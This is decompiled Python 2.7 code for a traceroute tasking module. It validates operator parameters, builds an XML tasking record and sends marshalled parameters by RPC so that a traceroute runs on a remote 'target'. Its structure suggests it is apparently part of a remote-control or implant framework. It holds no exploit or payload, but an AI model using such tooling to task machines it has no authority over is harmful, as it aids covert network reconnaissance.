# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Traceroute_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.resource
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.traceroute', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.traceroute.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['addr'] == None or len(lpParams['addr']) == 0:
        mcl.tasking.OutputError('A destination must be specified')
        return False
    else:
        tgtParams = mca.network.cmd.traceroute.Params()
        tgtParams.protocol = lpParams['prot']
        tgtParams.maxttl = lpParams['maxttl']
        tgtParams.queries = lpParams['queries']
        tgtParams.srcport = lpParams['srcport']
        tgtParams.dstport = lpParams['dstport']
        tgtParams.timeout = lpParams['timeout']
        tgtParams.srcAddr = lpParams['source']
        if lpParams['driverName'] != None:
            tgtParams.rawSendParam = lpParams['driverName']
        if len(tgtParams.rawSendParam) == 0:
            tgtParams.rawSendParam = mcl.tasking.resource.GetName('DmGz')
        gotValidDst = False
        try:
            import mcl.object.IpAddr
            tgtParams.dstAddr = mcl.object.IpAddr.IpAddr.CreateFromString(lpParams['addr'])
            gotValidDst = True
        except:
            pass

        if not gotValidDst:
            tgtParams.dstHost = lpParams['addr']
        taskXml = mcl.tasking.Tasking()
        if lpParams['prot'] == mca.network.cmd.traceroute.PARAM_TYPE_UDP:
            taskXml.SetType('UDP')
        elif lpParams['prot'] == mca.network.cmd.traceroute.PARAM_TYPE_TCP:
            taskXml.SetType('TCP')
        elif lpParams['prot'] == mca.network.cmd.traceroute.PARAM_TYPE_ICMP:
            taskXml.SetType('ICMP')
        else:
            taskXml.SetType('ICMP')
        if len(tgtParams.dstHost) > 0:
            taskXml.SetTargetRemote(tgtParams.dstHost)
        else:
            taskXml.SetTargetRemote('%s' % tgtParams.dstAddr)
        mcl.tasking.OutputXml(taskXml.GetXmlObject())
        rpc = mca.network.cmd.traceroute.tasking.RPC_INFO_SEND
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.traceroute.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)